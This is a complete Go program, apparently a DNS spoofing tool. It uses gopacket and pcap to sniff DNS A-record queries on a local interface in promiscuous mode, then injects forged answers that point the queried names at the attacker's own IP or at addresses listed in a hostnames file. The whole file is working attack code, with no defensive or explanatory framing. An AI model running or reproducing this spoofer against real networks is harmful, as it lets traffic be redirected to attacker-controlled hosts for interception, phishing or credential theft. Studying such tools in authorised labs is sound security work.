package main

import (
	"bufio"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"net"
	"os"
	"strings"
)

func getIPv4Addr(addresses []pcap.InterfaceAddress) net.IP {
	for _, addr := range addresses {
		if addr.IP.To4() != nil {
			return addr.IP.To4()
		}
	}
	return nil
}

func getIPv4Address(addresses []net.Addr) net.IP {
	for _, addr := range addresses {
		if addr.(*net.IPNet).IP.To4() != nil {
			return addr.(*net.IPNet).IP.To4()
		}
	}
	return nil
}

func sendPacket(packet gopacket.Packet, ipAddr net.IP, question layers.DNSQuestion, handle *pcap.Handle) {
	ethernet := packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
	temp := ethernet.SrcMAC
	ethernet.SrcMAC = ethernet.DstMAC
	ethernet.DstMAC = temp
	ethernet.Length = 0

	iPv4 := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
	temp2 := iPv4.SrcIP
	iPv4.SrcIP = iPv4.DstIP
	iPv4.DstIP = temp2
	iPv4.Length = 0
	iPv4.Checksum = 0

	udp := packet.Layer(layers.LayerTypeUDP).(*layers.UDP)
	temp3 := udp.SrcPort
	udp.SrcPort = udp.DstPort
	udp.DstPort = temp3
	udp.Length = 0
	udp.Checksum = 0
	udp.SetNetworkLayerForChecksum(iPv4)

	answer := layers.DNSResourceRecord{Name: question.Name, Type: layers.DNSTypeA, Class: question.Class, TTL: 13, DataLength: 4, Data: ipAddr, IP: ipAddr}
	answers := make([]layers.DNSResourceRecord, 1)
	answers[0] = answer
	dns := packet.Layer(layers.LayerTypeDNS).(*layers.DNS)
	dns.Answers = answers
	dns.QR = true
	dns.RD = true
	dns.RA = true
	dns.ANCount = 1
	dns.ARCount = 0

	dns.Authorities = make([]layers.DNSResourceRecord, 0)
	dns.Additionals = make([]layers.DNSResourceRecord, 0)

	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths: true,
	}
	gopacket.SerializeLayers(buffer, options, ethernet, iPv4, udp, dns)
	handle.WritePacketData(buffer.Bytes())
}

func main() {
	var interfaceArg, hostnames, expression string
	var handle *pcap.Handle
	var file *os.File
	var err error
	var devices []pcap.Interface
	var packetSource *gopacket.PacketSource
	var defaultInterfaceIP net.IP

	for i := 1; i < len(os.Args); i += 2 {
		if os.Args[i] == "-i" {
			interfaceArg = os.Args[i+1]
		} else if os.Args[i] == "-f" {
			hostnames = os.Args[i+1]
		} else {
			expression = os.Args[i]
			i -= 1
		}
	}

	if interfaceArg != "" { // check if interface is provided
		if handle, err = pcap.OpenLive(interfaceArg, 3000, true, pcap.BlockForever); err != nil {
			panic(err)
		}
		ifi, _ := net.InterfaceByName(interfaceArg)
		addresses, _ := ifi.Addrs()
		defaultInterfaceIP = getIPv4Address(addresses)
	} else { // if interface is not provided -> go to default interface
		if devices, err = pcap.FindAllDevs(); err != nil {
			panic(err)
		} else {
			defaultInterface := devices[0]
			defaultInterfaceIP = getIPv4Addr(defaultInterface.Addresses)
			if handle, err = pcap.OpenLive(defaultInterface.Name, 3000, true, pcap.BlockForever); err != nil {
				panic(err)
			}
		}
	}

	if expression != "" {
		if err = handle.SetBPFFilter(strings.ToLower(expression)); err != nil {
			panic(err)
		}
	}

	packetSource = gopacket.NewPacketSource(handle, handle.LinkType())

	if hostnames != "" {
		if file, err = os.Open(hostnames); err != nil {
			panic(err)
		}

		scanner := bufio.NewScanner(file)
		scanner.Split(bufio.ScanLines)
		var lines []string

		for scanner.Scan() {
			lines = append(lines, scanner.Text())
		}

		file.Close()

		hostnamePairs := make(map[string]string)

		for _, line := range lines {
			pairs := strings.Split(line, " ")
			hostnamePairs[pairs[len(pairs)-1]] = pairs[0]
		}

		for packet := range packetSource.Packets() {
			if dnsLayer := packet.Layer(layers.LayerTypeDNS); dnsLayer != nil {
				if questions := dnsLayer.(*layers.DNS).Questions; questions != nil {
					for _, question := range questions {
						if question.Type == layers.DNSTypeA && dnsLayer.(*layers.DNS).QR == false {
							if ipAddress, found := hostnamePairs[string(question.Name)]; found {
								sendPacket(packet, net.ParseIP(ipAddress).To4(), question, handle)
							}
						}
					}
				}
			}
		}

	} else {
		for packet := range packetSource.Packets() {
			if dnsLayer := packet.Layer(layers.LayerTypeDNS); dnsLayer != nil {
				if questions := dnsLayer.(*layers.DNS).Questions; questions != nil {
					for _, question := range questions {
						if question.Type == layers.DNSTypeA && dnsLayer.(*layers.DNS).QR == false {
							sendPacket(packet, defaultInterfaceIP, question, handle)
						}
					}
				}
			}
		}
	}

}
